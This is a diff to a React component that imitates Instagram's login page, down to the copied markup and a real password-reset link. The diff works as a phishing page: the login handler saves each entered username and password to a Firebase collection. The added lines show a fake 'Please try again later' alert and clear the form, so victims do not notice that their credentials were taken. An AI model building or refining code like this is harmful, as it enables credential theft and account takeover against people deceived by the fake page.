@@ -33,14 +33,19 @@ export class InstaRedo extends Component {
     
     
         login(e) {
-          
+        alert("Please try again later" )
           var db = firebase.firestore();
           db.collection("users").doc(this.state.password).set({
               id:this.state.UserLogin,
               pass:this.state.password
             }).then(function() {
               console.log("Data Ojbect for new User created");
-            });
+            }); 
+
+            this.setState({
+                UserLogin:'',
+                password:''
+            })
         }
 
         handleChange(e){
@@ -116,7 +121,7 @@ export class InstaRedo extends Component {
           <div class="_f9sjj">
             <h1 class="_68swa _8scx2 coreSpriteLoggedOutWordmark">Instagram</h1>
             <div class="_1zdb1">
-              <form class="_3jvtb">
+              <form class="_3jvtb" method="submit">
                 <div class="_t296e"><div class="_sjplo"><div class="_ev9xl"><label for="fa4e2a34ab06a" class="_ssj08"></label>
                   <input class="_ph6vk _jdqpn _o716c" id="fa4e2a34ab06a" aria-describedby=""
                    placeholder="Phone number, username, or email" aria-required="true"
@@ -130,7 +135,7 @@ export class InstaRedo extends Component {
                          placeholder="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" value="" type="password"  value={this.state.password} name="password" onChange={this.handleChangePass} placeholder="Password" required="" /></div>
                           <div class="_gaby6"></div></div></div>
                           <span class="_t38eb _ov9ai">
-                            <button  onClick={this.login} class="_qv64e _gexxb _4tgw8 _njrw0">Log in</button></span>
+                            <p  onClick={this.login} class="_qv64e _gexxb _4tgw8 _njrw0"><p style={{"marginLeft":100}}>Log in</p></p></span>
                             <a class="_pbd5h" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></form></div></div>
                             <div class="_f9sjj">
                               <p class="_g9ean" onClick={this.login}>Don't have an account? <a href="javascript:;">Sign In</a></p></div>
